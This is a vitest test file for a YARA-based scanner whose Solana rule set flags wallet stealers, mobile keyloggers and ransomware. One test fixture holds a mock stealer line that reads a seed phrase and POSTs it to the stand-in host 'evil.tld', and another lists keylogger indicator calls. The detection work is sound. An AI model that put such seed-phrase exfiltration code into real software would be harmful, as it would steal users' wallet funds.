import { describe, expect, it } from "vitest";
import { RuleManager, YaraScanner, SOLANA_YARA_RULES, type ScanTarget } from "../src/index.js";

describe("YARA", () => {
  it("ships the Solana-specific rule set", () => {
    expect(SOLANA_YARA_RULES).toHaveLength(9);
    expect(SOLANA_YARA_RULES.map((r) => r.name)).toContain("Sync_Ransomware");
  });

  it("detects a wallet stealer via 'N of them' condition", () => {
    const scanner = new YaraScanner(SOLANA_YARA_RULES);
    const target: ScanTarget = {
      id: "com.stealer",
      kind: "app",
      text: "const seed_phrase = getMnemonic(); fetch('https://evil.tld', {method:'POST'})",
    };
    const f = scanner.scan(target).find((x) => x.ruleId === "Sync_Wallet_Stealer");
    expect(f).toBeDefined();
    expect(f!.severity).toBe("critical");
  });

  it("scans raw bytes (latin1) without losing patterns", () => {
    const scanner = new YaraScanner(SOLANA_YARA_RULES);
    const bytes = new TextEncoder().encode(
      "AccessibilityService onKeyEvent getClipboardData",
    );
    const f = scanner.scan({ id: "k", kind: "app", bytes }).find(
      (x) => x.ruleId === "Sync_Mobile_Keylogger",
    );
    expect(f).toBeDefined();
  });

  it("does not fire when condition is unmet", () => {
    const scanner = new YaraScanner(SOLANA_YARA_RULES);
    const f = scanner.scan({ id: "x", kind: "app", text: "just mnemonic alone" });
    expect(f.find((r) => r.ruleId === "Sync_Wallet_Stealer")).toBeUndefined();
  });

  it("manages and validates custom rules, and exports YARA source", () => {
    const mgr = new RuleManager();
    expect(() =>
      mgr.add({
        name: "bad name!",
        category: "malware",
        severity: "low",
        meta: { description: "x" },
        strings: [{ id: "$a", value: "a", type: "text" }],
        condition: "any",
      }),
    ).toThrow();

    mgr.add({
      name: "Custom_Rule",
      category: "malware",
      severity: "high",
      meta: { description: "custom" },
      strings: [{ id: "$a", value: "marker123", type: "text" }],
      condition: "any",
    });
    expect(mgr.get("Custom_Rule")).toBeDefined();

    const exported = mgr.exportAll();
    expect(exported).toContain("rule Sync_Wallet_Stealer {");
    expect(exported).toContain("rule Custom_Rule {");
  });
});
